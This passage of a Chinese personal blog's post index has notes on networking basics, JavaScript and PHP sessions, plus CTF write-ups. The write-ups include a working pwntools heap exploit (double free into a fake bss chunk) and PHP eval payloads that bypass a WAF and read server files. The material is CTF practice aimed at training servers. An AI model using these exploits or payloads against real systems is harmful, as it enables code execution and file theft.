从技术层面上讲，CSMA/CD、二层交换技术都在该层工作，在硬件层面，网桥、二层交换机、MAC地址是在该层工作。3.网络层处于OSI模型的第三层，提供信源和信宿之间的信息传输服务、网络寻址服务、路由服务、地址翻译服务等。可以形象的理解该层的功能为生活中信件投递与接受过程中在信封上写上寄件人与收件人的地址，目标在于信件可以成功地从寄件人地手里发到收件人的地方。网络中的数据传输也是这样，需要为传输的数据标识信源和信宿的地址 IP地址、NAT技术就工作在该层，另外还有路由器、三层交换机等设备也都工作在网络层。4.传输层传输层为OSI模型的高层数据提供可靠的传输服务，并且它会将较大的数据封装分割成小块的数据分段， 目标在较大的数据封装在传输层的过程中容易造成很大的传输延迟，如果发生传输失败，数据重传将占用很大的时间，而被分割成较小块的数据分段后，可以很大程度上降低传输延时，即便是重传数据分段，所需要的传输延时也很小，这样可以提高传输的效率，然后被分割成较小的数据分段会在信宿处进行有序的重组，以还原成原始的数据。TCP,UDP等传输协议都工作在该层————————————MTU(Maximum Transmission Unit，做大传输单元)在介质及相关条件满足的情况下，一次传输所能承载的最大数据包大小（以字节为单位）。比如：以太网的MTU的值是1500，如果要传输1800大小的数据，传输层就要完成分段，将1800大小的数据分两次传输，一次传输1500，一次传输3005.会话层为用户间建立或拆除的会话，该层次的服务可使应用建立和维持会话，并能使会话获得同步。6.表达层为不同通信系统制订一种相互都能理解的通信语言标准，这是因为不同的计算机体系结构使用数据表示法不同，比如：IBM公司的计算机使用EBCDIC编码，而大部分PC机使用的是ASCII码7.应用层应用层直接和网络应用服务关联，这是与用户进行交互的一个过程，所谓的网络应用服务就是指Http、Ftp、DNS等应用层协议。 后续有了更深的理解继续补充","tags":[]},{"title":"理解IP地址分类、子网掩码、默认网关、VLSM_CIDR","date":"2020-05-02T01:45:43.000Z","path":"2020/05/02/理解IP地址分类、子网掩码、默认网关、VLSM-CIDR/","text":"IP地址的分类A类：1.0.0.1-126.255.255.254 子网掩码：255.0.0.0B类：128.1.0.1-191.254.255.254 子网掩码：255.255.0.0C类：192.0.0.1-223.255.254.254 子网掩码：255.255.255.0D类：224.0.0.1-239.255.255.254 组播地址E类为保留实验用 假设有一台服务器，三台主机，服务器要发送1.5M的数据，如果采用单播的形式，则服务器会产生1.5*3M的数据，去给三台主机一一发送。如果采用广播的形式，则不需要这个数据的主机也会被迫接受，增大了主机的压力。如果采用组播的形式，那么只有在同一个组内的主机接受这个数据，其它主机不会接受这个数据。 特殊IP地址说明127.0.0.1：环回地址 指本地机，一般用来测试，被保留。主机ID部分被译成二进制后，全是 “1” 和 “0”的作保留。比如: 192.168.1.255/24 这个地址的主机ID换成二进制后就是”11111111”,这表示192.168.1.255子网内的广播地址。比如：192.168.1.0/24，主机ID转换成二进制后就是”00000000”, 这表示192.168.1.0的整个子网. 自动专用IP寻址(APIPA, Automatic Private IP Addressing)是一个DHCP故障转移机制，当DHCP服务器出现故障时，APIPA在169.254.0.1到169.254.255.254的私有空间内分配地址，所有设备使用默认的网络掩码255.255.0.0。APIPA可以为没有DHCP服务器的单网段网络提供自动配置TCP/IP协议的功能。 用子网掩码来识别网络ID和主机ID每个IP地址都包含两个部分：网络ID和主机ID。网络ID标识在同一个物理网络上的所有主机，主机ID标识该物理网络上的某一台具体的主机。子网掩码就是用于识别一个IP地址的网络ID与主机ID的关键。将子网掩码与IP地址作一个配对，子网掩码十进制数是”255”(二进制是11111111)的对应的IP地址部分就是IP地址的网络ID，子网掩码十进制数”0”对应的就是主机ID。IP地址为192.168.1.0；子网掩码为255.255.255.0；可表示为192.168.1.0/24 计算一个IP子网内的主机数计算一个子网内可容纳多少主机的公式：(2^n - 2) n表示：主机ID “0” 的个数。减掉的2是指 网络ID 和 广播地址。例如192.168.1.0/24的主机ID全为 “0”表示为网络ID。如192.168.1.255/24的主机ID全为”1”表示为广播地址。 理解默认网关默认网关通常指示一个IP网络需要向另一个IP网络通信的最后通道(数据转发点)把数据通向远程子网的最后一道门 理解可变长子网掩码VLSM与无类域间的路由CIDR提出VLSM的原因是减小IP地址的浪费，让IP地址的计算更加合理比如两点专线的路由器之间可以使用202.202.1.0/30，那么202.202.1.0/30该子网刚好只有两个主机，保证了一个地址都没有浪费。 CIDR将数个IP网络结合在一起，使用一种无类别的理由选择算法，可以减少由internet核心路由器选择算法，可以减小由internet核心路由器的路由记录数目，事实上CIDR构建了一个“超级网络”，也是VLSM的一个逆向过程。VLSM是把一个较大的主类网络化小，而CIDR是把多个较小的网络汇聚例如:202.202.1.0/24202.202.2.0/24202.202.3.0/24上面三个网络可以汇聚成 202.202.0.0/16","tags":[]},{"title":"gyctf_2020_some_thing_exceting 复现","date":"2020-04-16T14:42:48.000Z","path":"2020/04/16/gyctf-2020-some-thing-exceting-复现/","text":"查看保护除了PIE其它全都开了 代码审计这里在bss段写入了一个0x60，也把flag读入了0x60后面 这里明显存在UAF漏洞 审计其它代码，发现只有create，delete，view功能 漏洞利用既然程序已经在程序中写入了一个0x60,后面跟的flag，可以考虑伪造chunk到bss段之后输出flag 具体步骤: add(0x58, 0x58) #0 add(0x58, 0x58) #1 free(0)在第一次free操作后可以发现在fastbin中的链表结构为chunk2-&gt;chunk1如果在进行一次free(0)的操作，fastbin中的链表结构会变成:chunk2-&gt;chunk1-&gt;chunk2但是不能两次free(0)操作连着进行，这样会触发double free错误，原因在于free((void **)ptr[v1]);free(((void **)ptr[v1] + 1));free(ptr[v1]); 这条语句执行后 ptr[v1] 指向的内容也就是chunk1的地址就没了，ptr[v1]指向0了，后续如果连续调用两次delete函数，free(*(void **)ptr[v1]) 就变成了free(0), free(*((void **)ptr[v1] + 1)) 就变成了 free(addr(chunk2)) ,而此时的fast bin为：chunk2-&gt;chunk1 这样就触发了double free错误了,所以需要把ptr[1]也给free掉 free(1)此时fast bin的结构为: free(0)之后就是伪造chunk到bss段再读取flag了 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *import sysimport oscontext(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])#context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])context.log_level='debug'debug = 0def init(): global p execve = \"./gyctf_2020_some_thing_exceting\" if debug == 1: p = process(execve) if sys.argv[1] == '1': gdb.attach(p) else: #ip = \"10.0.%s.140\" % sys.argv[1] ip = \"node3.buuoj.cn\" host = \"25981\" p = remote(ip, host)def pwn(): def add(le, le2, ct1=\"\\n\", ct2=\"\\n\"): p.sendlineafter(\"&gt; Now please tell me what you want to do :\", str(1)) p.sendlineafter(\"&gt; ba's length :\", str(le)) p.sendafter(\"&gt; ba :\", ct1) p.sendlineafter(\"&gt; na's length :\", str(le2)) p.sendafter(\"&gt; na :\", ct2) def free(idx): p.sendlineafter(\"&gt; Now please tell me what you want to do :\", str(3)) p.sendlineafter(\"&gt; Banana ID : \", str(idx)) def show(idx): p.sendlineafter(\"&gt; Now please tell me what you want to do :\", str(4)) p.sendlineafter(\"&gt; SCP project ID : \", str(idx)) #2-&gt;4-&gt;3-&gt;2 add(0x58, 0x58) #0 add(0x58, 0x58) #1 free(0) free(1) raw_input() free(0) add(0x58, 0x58, p64(0x602098)) #2 #3-&gt;2-&gt;flag add(0x58, 0x58) #3 add(0x58, 0x28) #4 show(4) p.interactive()if __name__ == '__main__': init() pwn() flag:","tags":[{"name":"double free, uaf","slug":"double-free-uaf","permalink":"http://wafuter.jxustctf.top/tags/double-free-uaf/"}]},{"title":"[强网杯 2019]高明的黑客 复现","date":"2020-04-14T13:53:35.000Z","path":"2020/04/14/强网杯-2019-高明的黑客-复现/","text":"学习的博客：https://blog.csdn.net/a3320315/article/details/102945940?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1 打开网站，提示源码在一个压缩包里面，之后下载打开![image][tmp1] 解压缩后发现有很多个php文件，然后蒙蔽，找wp 看了wp发现这些php文件里大多都有$_get[]、$_post[]传参与命令执行函数eval，但是不是每个php文件中的eval函数都能利用，那么只能写脚本列举全部一个一个去试了 脚本涉及函数一一找资料学习下： 1.time.asctime()函数Python time asctime() 函数接受时间元组并返回一个可读的形式为”Tue Dec 11 18:07:14 2008”（2008年12月11日 周二18时07分14秒）的24个字符的字符串。示例: 123import timeprint(time.asctime())# Tue Apr 14 22:42:08 2020 2.time.localtime()函数描述：Python time localtime() 函数类似gmtime()，作用是格式化时间戳为本地的时间。 如果sec参数未输入，则以当前时间为转换标准。 DST (Daylight Savings Time) flag (-1, 0 or 1) 是否是夏令时。 示例： 123import timeprint(time.localtime())# time.struct_time(tm_year=2020, tm_mon=4, tm_mday=14, tm_hour=22, tm_min=37, tm_sec=13, tm_wday=1, tm_yday=105, tm_isdst=0) 3.time.time()函数描述：Python time time() 返回当前时间的时间戳（1970纪元后经过的浮点秒数）。 返回当前时间的时间戳（1970纪元后经过的浮点秒数）。 123import timeprint(time.time())# 1586875436.7926576 4.线程threading.Thread()函数基本语法mthread = threading.Thread(target=function_name, args=(function_parameter1, function_parameterN))示例: 123456789101112131415161718192021222324252627282930313233343536# coding=utf-8import osimport timeimport requestsimport threadingprint(\"begin: \" + time.asctime(time.localtime(time.time())))path = r\"E:\\\\test\"os.chdir(path)files = os.listdir(path)#print(files)#['1.txt', '2.txt', '3.txt']requests.adapters.DEFAULT_RETRIES = 5session = requests.Session()session.keep_alive = Falses1=threading.Semaphore(5)def test(file): s1.acquire() with open(file, encoding=\"utf-8\") as f: while True: s = f.readline() print(s) if not s: break print(\"over: \" + time.asctime(time.localtime(time.time()))) s1.release()for i in files: t = threading.Thread(target=test, args=(i,)) t.start() result:begin: Wed Apr 15 13:39:16 2020adsfasdsfsdasd over: Wed Apr 15 13:39:16 2020over: Wed Apr 15 13:39:16 2020sdfasdg over: Wed Apr 15 13:39:16 2020 5.threading.Semaphore()函数学习博客：https://blog.csdn.net/a349458532/article/details/51589460线程的概念:线程，有时被称为轻量级进程(Lightweight Process，LWP），是程序执行流的最小单元。一个标准的线程由线程ID，当前指令指针(PC），寄存器集合和堆栈组成。另外，线程是进程中的一个实体，是被系统独立调度和分派的基本单位，线程自己不拥有系统资源，只拥有一点儿在运行中必不可少的资源，但它可与同属一个进程的其它线程共享进程所拥有的全部资源。1. 基本介绍Semaphore 在内部管理着一个计数器。调用 acquire() 会使这个计数器 -1，release() 则是+1.计数器的值永远不会小于 0，当计数器到 0 时，再调用 acquire() 就会阻塞，直到其他线程来调用release()2. acquire(blocking=True,timeout=None)本方法用于获取 Semaphore当使用默认参数调用本方法时：如果内部计数器的值大于零，将之减一，并返回；如果等于零，则阻塞，并等待其他线程调用 release() 方法以使计数器为正。这个过程有严格的互锁机制控制，以保证如果有多条线程正在等待解锁，release() 调用只会唤醒其中一条线程。唤醒哪一条是随机的。本方法返回 True，或无限阻塞如果 blocking=False，则不阻塞，但若获取失败的话，返回 False3. release()释放 Semaphore，给内部计数器 +1，可以唤醒处于等待状态的线程脚本中的 threading.Semaphore(100) 是指同时最多有一百个线程运行 6.os.chdir()描述:os.chdir() 方法用于改变当前工作目录到指定的路径。 7.os.listdir()os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。 暂时咕咕咕，补点网络协议基础再来","tags":[]},{"title":"javascript 变量、作用域和内存问题","date":"2020-04-14T09:27:49.000Z","path":"2020/04/14/javascript-变量、作用域和内存问题/","text":"ECMAScript 变量可能包含两种不同的数据类型的值：基本类型值和引用类型值。基本类型值指的是简单的数据段，而引用类型值指哪些可能由多个值构成的对象。在将一个赋给变量时，解析器必须确定这个值是基本类型值还是引用类型值。基本类型值包括：Undefined, Null, String, Boolean, Number引用类型的值是保存在内存中的对象。与其它语言不同，JavaScript不允许直接访问内存中的内容，也就是说不能直接操作对象的内存空间。在操作对象时，实际上是在操作对象的引用而不是实际的对象。为此，引用的值是按引用访问的。 1. 可以为引用类型的值添加属性和方法 123var person = new Object();person.age = 2000;console.log(person.age); 2. 复制变量值(1.基本类型值变量之间的复制，两个变量互不影响，所代表的值是一样的(2.引用类型值变量之间的复制，实际上是一个指针，复制以后两个变量都指向同一个对象 3. 传递参数ECMAScript中所有参数都是按值传递的。也就是说，把函数外部的值赋值给函数内部的值，就把和值从一个变量赋值给另一个变量一样。可以参考C语言传参，变量和指针，感觉产不多一样的 4. 检测类型除了typeof还有instanceof操作符result = variable instanceof constructor如果变量是给定引用类型的实例，instanceof操作符就会返回true 12alert(person instanceof Object); //变量 person 是Objuect吗alert(person instanceof Array); //变量 person 是Array吗 根据规定，所有引用类型的值都是Object的实例。因此，在检测一个引用类型值和Object构造函数时，instanceof操作符始终会返回true。如果使用instanceof操作符检测基本类型时，则该操作符始终会返回false，因为基本类型不是对象。 5. 执行环境及作用域全局执行环境是最外围的一个执行环境。根据ECMAScript实现所在宿主环境不同，表示执行环境的对象那个也不一样。在web浏览器中，全局执行环境被认为是windows对象，因此所有全局变量和函数都是作为window对象的属性和方法创建的。全局执行环境知道应用程序退出——例如关闭网页或浏览器——时才会被销毁。 6. 延长作用链这两个语句都会在作用域链的前端添加一个变量对象。对with语句来说，会将指定的对象添加到作用域链中。对catch语句来说，会创建一个对象，其中包含的组五十对象的声明。 1234567function buildsstr() &#123; var qs = \"?debug=true\"; with(location)&#123; var url = href + qs; &#125;&#125; 上述代码中location对象被添加到了作用域链的前端。 7. 没有块级作用域 12345if (true) &#123; var color = \"green\";&#125;console.log(color);&#125; 如果在C、C++或java中，color会在if语句执行完毕后被销毁。但在javaScript中，if语句中的变量声明会将变量添加到当前的执行环境。在for语句中要记住，for(var i=0;i &lt; 10; i++) 变量i在for语句结束后，也依旧会存在于循环外部的执行环境中。(1. 声明变量使用var变量声明的变量会自动的被添加到最接近的环境中。在函数内部，最接近的环境就是函数的局部环境；在with语句中，最接近的环境是函数环境。如果初始化变量时没有使用var声明，该变量被自动的添加到全局话经。 1234567function add(num1, num2) &#123; var sum = num1 + num2; // sum = num1 + num2; return sum;&#125;var result = add(1, 2);console.log(sum); // 会导致错误，如果去掉var修饰符就变成了全局变量，就正确了 (2. 查询标识符当在某个环境中为了读取或写入而引用一个标识符时，必须通过搜索来确定该标识符实际代表什么。搜索过程从作用域链的前端开始，向上逐级查询与给定名字匹配的标识符。如果在局部环境中找到了该标识符，搜索过程停止，变量就绪。如果在局部环境中没有找到该变量名，则继续沿作用域链向上搜索。搜索过程将一直追溯到全局环境的变量对象。如果在全局环境中没有找到这个标识符，则意味着该变量尚未声明。 8. 管理内存一旦数据不再有用，最好通过将其值设置未null来释放其引————这个做法叫做解除引用。这一做法适用于大多数全局变量和全局对象的属性。 123456789function createPerson(name) &#123; var localPerson = new Object(); localPerson.name = name; return localPerson;&#125;var globalPerson = createPerson(\"cx\");// 手工解除gobalPerson的引用globalPerson = null;","tags":[]},{"title":"javascript 语句与函数","date":"2020-04-13T06:22:10.000Z","path":"2020/04/13/javascript 语句与函数/","text":"写一些javascript 比较独特的语句 1. for-in语句for-in语句是一种精准的迭代语句，可以用来枚举对象的属性。for (property in expression) statement示例：for (var propName in window) { document.write(propName)}上述示例使用for-in循环显示了BOM中window对象的所有属性。ECMAScript对象的属性没有顺序，所以通过for-in输出的属性名是不可预测的。如果表示要迭代的对象的变量值为null或undefined，for-in语句会抛出错误。ECMAScript5更正了这一行为；对这种情况不再抛出错误，而只是不执行循环体。 2. label语句使用label语句可以在代码中添加标签，以便将来使用。label: statment示例：start: for (var i=0; i &lt; count; i++) { alert(i); if (i == 2){ break start; }}break和continue语句都可以与label语句联合使用，从而返回代码中的特定的位置 3. with语句with语句的作用是将代码的作用域设置到一个特定的对象中。with (expression) statement;定义with语句的母的主要是为了简化多次编写同一个对象的工作，示例： 123var qs = locat.search.substring(1);var hostName = location.hostname;var url = location.href; 上面几行代码都包含location对象。如果使用with语句，可以把上面的代码改写成如下所示； 12345with(location) &#123;var qs = search.substring(1);var hostName = hostname();var url = href;&#125; 上述代码使用了with语句关联了location对象。这意味着with语句的代码块内部，每个变量首先被认为是一个局部变量，而如果在局部环境中找不到该变量的定义，就会查询location对象是否有同名的属性。如果发现了同名的属性，则以location对象属性的值作为变量的值。严格模式下不允许使用with语句，否则将视为语法错误。 函数 1. 一般定义 123function functionName(arg0, arg1, ..., argN) &#123; statments;&#125; 2. 理解参数ECMAScript函数不介意传递进来多少个参数，也不在乎传进来的参数是什么数据类型。即使定义的函数只声明了两个参数也未必一定要传递两个参数，可以传递一个、三个甚至不传参数，原因是ECMAScript中的参数在内部是用一个数组来表示的。在函数体内可以通过arguments对象来访问这个参数数组，从而获取传递给函数的每一个参数。通过访问arguments对象的length属性可以获知有多少个参数传递了函数。另一个与参数相关的重要方面，就是arguments对象可以与命名参数一起使用。示例： 12345678function deAdd(num1, num2) &#123; if (arguments.length == 1) &#123; alert(num1 + 10);&#125; if (arguments.length == 2) &#123; alent(arguments.length == 2);&#125;&#125; 关于arguments的行为，还有一点是它的值永远与对应命名参数保持同步。关于参数还有一点，没有传递值的命名参数将自动被赋予undefined值。严格模式对如何使用arguments对象做出了一些限制，如果像arguments[1]设置为10，num2的值仍是undefined，其次，重写arguments的值会导致语法错误。3. 重载ECMAScript函数不能像传统意义那样实现重载(不支持函数签名的特点)。如果在ECMAScript中定义了两个名字相同的函数，则该名字只属于后定义的函数。","tags":[]},{"title":"javascript 操作符","date":"2020-04-13T05:28:20.000Z","path":"2020/04/13/javascript 操作符/","text":"javascript一些要注意的操作符 1. 位操作符(1.在ECMAScript中，当对数值应用位操作符时，后台会发生如下转换过程：64位的数值被转换成32位数值，然后执行位操作，最后再将32位的结果转换回64位。这个转换过程也导致了一个严重的副效应，即在对特殊的NaN和infinity应用位操作时都会被当成0来处理。(2.如果对非数值来应用位操作符，会先用number()函数将该值转换为一个数值（自动完成），再引用位操作，得到的结果将是一个数值。(3.有符号的左移右移用 &lt;&lt; 于 &gt;&gt;表示，无符号数右移用&gt;&gt;&gt;，左移操作符&lt;&lt;不会影响操作数的符号位。 2. 乘法(1.Infinity与0相乘，则结果时NaN(2.Infinity与非0数值相乘，则结果是Infinity 或 -Infinity,取决于另一个操作数的符号(3.如果有一个操作数不是数值，则在后台调用Number()将其转换为数值，然后再应用上面的规则 3. 除法(1.零被零除，则结果是NaN(2.Infinity与Infinity除，结果是NaN(3.如果非零的有限数被零除，则结果是Infinity或-Infinity，取决于有符号操作数的符号。(4.如果是Infinity被任何非零数除，则结果是Infinity或-Infinity，取决于有符号操作数的符号。(5.如果有一个操作数不是数值，则在后台调用Number()将其转换为数值，然后再应用上面的规则 4. 加法(1.+0加-0，则结果是+0(2.如果只有一个操作符是字符串，则将另一个操作数转换为字符串，然后再将两个字符串拼接起来(3.如果有一个操作数是对象、数值或布尔值，则调用它们的toString()方法取得相应的字符串，然后再应用前面关于字符串的规则。对于undefined和null，则分别调用String()函数取得字符串”undefined”和”null”。 5. 减法(1.-0减+0，结果是-0，-0减-0，结果是+0(2.如果有一个操作数是对象，则调用对象的valueof()方法以取得表示该对象的数值。如果得到的值是NaN，则减法的结果就是NaN。如果对象没有valueOf()方法，则调用其toString()方法并将得到的字符串转换成数值。 6. 相等操作符(1. 如果一个操作数是字符串，另一个操作数是数值，在比较相等性之前先将字符串转换为数值。(2。null和undefined是相等的(3。如果有一个操作数是NaN，则相等操作符返回false 7. 逗号操作符使用逗号操作符可以在一条语句中执行多个操作，例如：var num1=1, num2=2, num3=3;逗号操作符还可以用于赋值。在用于赋值时，逗号操作符总会返回表达式中的最后一项，例如：var num = (5, 1, 4, 8, 0); //num 的值为0","tags":[]},{"title":"javascript学习一","date":"2020-04-11T15:27:47.000Z","path":"2020/04/11/javascript 数据类型/","text":"typeof 操作符检测变量的数据类型 1234var message=\"fu*k\";console.log(message);&gt;&gt;string undefined、Null、Boolean、Number、String、Object类型 1. undefinedundefined 类型只有一个值，即特殊的undefined。在使用var声明变量但未对其加以初始化时这个变量的值就是undefined.例如: 12var message;console.log(message == undefined); // true 但是undefined和未定义的变量还是不一样的例如: 1234var message;//var ageconsole.log(message)console.log(age) // 错误 2. Null类型Null 类型是第二个只有一个值的数据类型，这个特殊的值是null。从逻辑角度来看，null值表示一个空对象指针，而这也是正是使用typeof操作符检测null值时会返回”object”的原因。如果定义的变量准备在将来用于保存对象，那么最好将该变量初始化为null而不是其它值，这样一来，只要直接检测null值就可以知道相应的变量是否已经保存了一个对象的引用。实际上，undefined值是派生自null值的，因此ECMA-262规定对它们得相等性测试要返回trueconsole.log(null == undefined) // true 3.BooleanBoolean 类型是ECMAScript中使用得最多的一种类型，该类型只有两个字面值:true 和 false，区分大小写,true不一定等于一，false不一定等于零可以对任何数据类型的值调用Boolean()函数，而且总会返回一个Boolean的值数据类型 true falseString 任何非空字符串 “”Number 任何非零数字(包括无穷大) 0和NaNObject 任何对象 nullundefined 不适用 4.Number整数可以通过八进制，十进制和十六进制表示八进制字面值的第一位必须是零，然后是八进制数字序列(0-7)，如果字面值超出了范围，那么前导零将被忽略，后面的数值将被当作十进制数值解析。八进制字面量在严格模式下是无效的，会导致支持该模式的javascript引擎抛出错误。十六进制字面量的前两位必须是0x,后跟任何十六进制数字(0-9 及 A~F)，字母可以大写也可以小写在进行算数运算时，所有以八进制和十六进制的数值最终都被转化成十进制数值。1.浮点数值浮点数值需要的内存空间是保存整数值的两倍，因此ECMScript会不失时机地将浮点数转化为整数值，如果浮点数值本身表示地就是一个整数(如1.0)，那么该值也会被转换为整数。小数点前面可以没有整数 var floatNum = .1; //有效，但不推荐小数点后可以不跟数字 var num = 1.; //有效对于极大或极小地数值，可以用e表示法：var fnum = 3.125e7; //等于31250000浮点数值地最高精度是17位小数2.数值范围由于内存地限制，ECMAScript并不能保存世界上所有地数值。ECMAScript能够表示地最小数值保存在Number.MIN_VALUE中，在大多数浏览器中，这个值是 5e-324;能够表示地最大数值保存在Number。MAX_VALUE中。如果某次计算地结果超出了javascript数值范围地值，则会被自动地转换成特殊地Infinity地值。是负数则会转换成-Infinity要确定一个数值是不是有穷地，可以使用isFinite()函数3.NaNNaN就是非数值(Not a Number)，是一个特殊的数值，这个数值用于表示一个本来要返回数值的操作数未返回数值的情况。NaN 有两个非同寻常的特点：(1.任何涉及NaN的操作都会返回NaN(2.NaN与任何值都不想等存在isNaN()函数确定参数是否“不是数值”，不能被转换为数值的值都会导致这个函数返回trueisNaN(“blue”) //true 不能被转化成数值isNaN(“10”) //false 可以转化4.数值转换有三个函数可以把非数值转化成数值:number(),parseInt()和parseFloat()number()函数的转换规则:(1.true和false分别被转化成1和0(2.null，返回0(3.undefined返回NaN(4.如果是字符串,如果只包含数字，则转换为十进制数，”011”会被转化成11, 前导零忽略，浮点格式会被转换成浮点数，忽略前导零，如果是有效的十六进制数，则会转换成相同大小的十六进制数，如果字符串为空，则将其转换成0。如果包含上述格式之外的字符，则转换为NaN.parseInt()函数的转换规则:转换字符串时会忽略字符串前面的空格、直至找到第一个非空格字符。如果第一个字符不是数字字符或者负号，parseInt()就会返回NaN;也就是说parseInt()转换空字符串会返回NaN;如果字符串以’0x’开头且后跟数字字符，就会解析成一个十六进制整数；如果字符串以“0”开头且后跟数字字符，则会解析成一个八进制数。在ECMAScript5 javascript引擎中不具有解析八进制数的能力，因此前导零会被认为无效也可以使用第二个参数更具体地解析字符串，例如parseInt(“10”, 2) parseInt(“10”, 8)…parseFloat()函数与parseInt()函数类似，都是从第一个字符开始解析，到字符串末尾或一个无效的浮点数字字符为止。 5.StringString类型用于表示由零或多个16位Unicode字符组成的字符序列，即字符串。与php双引号与单引号会影响字符串的解析不同，ECMAScript中这两种方式没什么影响。字符串的特点：ECMAScript中的字符串是不可变的。如果字符串中包含双字节字符，那么length属性可能不会精确地返回字符串中的字符数目。转换为字符串(1.使用toString()函数，数值、布尔值、对象和字符串值都有toString()方法，但null和undefined没有这个方法。(2.在不知道要转换的值不是null或undefined的情况下还可以使用转型函数String()，能够将任何类型的值转化成字符串。 6.ObjectECMAScript中的对象是一组数据和功能的集合。对象可以通过执行new操作符后跟要创建的对象类型的名称来创建。var a = new Object(); 如果不给构造函数传递参数，则可以省略后面的那一堆圆括号，不推荐这么做object的每个实例都具有下列属性和方法：(1.constructor保存着用于创建当前对象的函数(2.hasOwnProperty(propertyName):用于检查给定的属性在当前对象实例中(而不是在实例的原型中)是否存在。作为参数的属性名必须以字符串指定(3.isPrototypeOf(object):用于检查传入的对象是否为当前对象的原型(4.propertyIsEnumerable(propertyName):用于检查给定的属性是否能够使用for-in语句来枚举。与hasOwnProperty()方法一样，作为参数的属性名必须以字符串形式指定(5.toLocaleString():返回对象的字符串表示，该字符串与执行环境的地区对应(6.toString():返回对象的字符串表示(7.valueOf()返回对象的字符串、数值或布尔值表示。","tags":[{"name":"javascript","slug":"javascript","permalink":"http://wafuter.jxustctf.top/tags/javascript/"}]},{"title":"buuoj 刷题记录三","date":"2020-04-11T13:16:39.000Z","path":"2020/04/11/buuoj-刷题记录三/","text":"[RoarCTF 2019]Easy Calc学习的博客: https://blog.csdn.net/weixin_44037296/article/details/105188575 https://blog.csdn.net/weixin_44077544/article/details/102630714 直接打开页面，显示一个简单的计算器画面，直接点击查看页面源码 根据页面源码的提示开了waf，虽然我不知道waf是什么，还发现了一个calc.php 尝试访问calc.php，访问成功 可以看到有个正则表示过滤和一个eval函数，那么比较直观的想到通过eval进行代码执行 看上面的wp先传入 ? num=var_dump(scandir(chr47)) 总之先试试，先进行连路边的老奶奶都会的GET传参，去掉空格直接forbidden。。 payload好理解，var_dump会返回变量的类型和值，由于正则表达式过滤了’\\‘,就用chr(47)代替，先查看当前目录有哪些文件，但是为什么要在num前面加个空格？wp上解释是WAF限制了参数num，将传入的参数’num’前添加空格，即’? num’可绕过WAF的判断在变量前面加个空格会让waf识别不了这个变量也就不会被限制了 按原来的payload可以显示出当前目录下有哪些文件，发现flag文件 那么要读取f1agg文件，就要执行读取文件的函数，这里用的是file_get_contents()函数，/f1agg全部用ascii代码这里用的是? num=var_dump(file_get_contents((chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))));flag就读取到了","tags":[]},{"title":"HCTF2018 admin 复现","date":"2020-04-09T14:06:44.000Z","path":"2020/04/09/HCTF2018-admin-复现/","text":"session 详细了解学习的博客：https://blog.csdn.net/h19910518/article/details/79348051 写的真是好 session_start()这是个无任何返回值的函数，既不会报错，也不会成功。它的作用是开启session，并随机生成一个唯一的32位的session_id，类似于这样：4c83638b3b0dbf65583181c2f89168ec 每次我们访问一个页面，如果有开启session，也就是有session_start() 时，就会自动生成一个session_id 来标注是这次会话的唯一ID，同时也会自动往cookie里写入一个名字为PHPSESSID的变量，它的值正是session_id，当这次会话没结束，再次访问的时候，服务器会去读取这个PHPSESSID的cookie是否有值有没过期，如果能够读取到，则继续用这个session_id，如果没有，就会新生成一个session_id，同时生成PHPSESSID这个cookie。由于默认生成的这个PHPSESSID cookie是会话，也就是说关闭浏览器就会过期掉，所以，下次重新浏览时，会重新生成一个session_id。 session 一般存贮在服务器端的\\tmp目录下，同样也是用到session_id。session_id是32位的，服务器会用 sess_前缀 + session_id 的形式存在这个临时目录下每一次生成的session_id都会生成一个这样的文件，用来保存这次会话的session信息。例如sess_bjvlo4p38cfqkr1hr7pe924ts3 这样的文件名 往session文件中写数据:例如$_SESSION[‘hello’] = 123;$_SESSION[‘word’] = 456; 数据存放形式为：hello|i:123;word|i:456;是序列化的数据，我们肉眼也能读出来。当我们往$_SESSION全局变量里写数据时，它会自动往这个文件里写入。读取session的时候，也会根据session_id 找到这个文件，然后读取需要的session变量。 大致总结: HTTP请求一个页面后，如果用到开启session，会去读cookie中的PHPSESSID是否有，如果没有，则会新生成一个session_id，先存入cookie中的PHPSESSID中，再生成一个sess_前缀文件。当有写入$_SESSION的时候，就会往sess_文件里序列化写入数据。当读取的session变量的时候，先会读取cookie中的PHPSESSID，获得session_id，然后再去找这个sess_sessionid文件，来获取对应的数据。由于默认的PHPSESSID是临时的会话，在浏览器关闭后，会消失，所以，我们重新访问的时候，会新生成session_id和sess_这个文件。 有关session的几个变量 SID,session_id(),$_COOKIE[“PHPSESSID”] SID 是一个系统常量，SID包含着会话名以及会话 ID 的常量，格式为 “name=ID”，或者如果会话 ID 已经在适cookie 中设定时则为空字符串，第一次显示的时候输出的是SID的值，当你刷新的时候，因为已经在cookie中存在，所以显示的是一个空字符串。session_id() 函数用来返回当前会话的session_id，它会去读取cookie中的name，也就是PHPSESSID值。 session的相关配置 [Session]session.save_handler = filessession.save_path = “d:/wamp/tmp”session.use_cookies = 1session.name = PHPSESSIDsession.auto_start = 0session.cookie_lifetime = 0session.serialize_handler = phpsession.gc_divisor = 1000session.gc_probability = 1session.gc_maxlifetime = 1440 session.save_handler = files 表示的是session的存储方式，默认的是files文件的方式保存，sess_efdsw34534efsdfsfsf3r3wrresa, 保存在 session.save_path = “d:/wamp/tmp” 里，所有这2个都是可配值得。我们上面的例子就是用的这种默认的方式。 save_handler 不仅仅只能用文件files，还可以用我们常见的memcache 和 redis 来保存。 session.use_cookies 默认是1，表示会在浏览器里创建值为PHPSESSID的session_id，session.name = PHPSESSID 找个配置就是改这个名字的，你可以改成PHPSB, 那这样就再浏览器里生成名字为PHPSB的session_id 。 session.auto_start = 0 用来是否需要自动开启session，默认是不开启的，所有我们需要在代码中用到session_start();函数开启，如果设置成1，那么session_id 也会自动就生成了。 session.cookie_lifetime = 0 这个是设置在客户端生成PHPSESSID这个cookie的过期时间，默认是0，也就是关闭浏览器就过期，下次访问，会再次生成一个session_id。所以，如果想关闭浏览器会话后，希望session信息能够保持的时间长一点，可以把这个值设置大一点，单位是秒。 复现学习的博客：https://www.jianshu.com/p/f92311564ad0 解法一 flask 